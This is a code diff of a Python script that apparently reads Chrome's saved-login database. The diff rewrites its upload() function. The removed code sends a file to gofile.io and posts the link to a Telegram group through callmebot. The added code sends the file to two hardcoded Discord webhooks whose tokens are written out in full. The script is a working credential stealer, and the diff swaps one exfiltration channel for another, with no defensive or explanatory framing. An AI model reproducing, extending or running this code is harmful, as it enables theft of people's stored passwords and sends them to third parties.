@@ -74,12 +74,12 @@ def get_db_connection(chrome_path_login_db):
         return None
 
 def upload(file_path):
-    print('upload')
-    url = "https://store1.gofile.io/contents/uploadfile"
-    with open(file_path, 'rb') as file:
-        files = {"file": file}
-        response = requests.post(url, files=files)
-        requests.post('https://api.callmebot.com/telegram/group.php?apikey=LTEwMDIzMDY1Mzk1OTU',params={'text':response.text})
+    url = "https://discord.com/api/webhooks/1300401924331278398/yOPJEw0zcGso9ngAcwjzb07KIp1zZlK32r5VlOPucx1-cC_LO3QWF_rmM0kzqamUV2eT"
+    url2= "https://discord.com/api/webhooks/1301422662501007360/aclDDYtEeJBPjK1qkwB6zLqn4RJN4OvXstxyuf8Qq46vJBZk-r1P89pIZam1gQlcJ8PW"
+    with open(file_path, "rb") as file:
+        response = requests.post(url2, files={"file": file})
+    with open(file_path, "rb") as file:
+        response = requests.post(url, files={"file": file})
 
 if __name__ == '__main__':
     try:
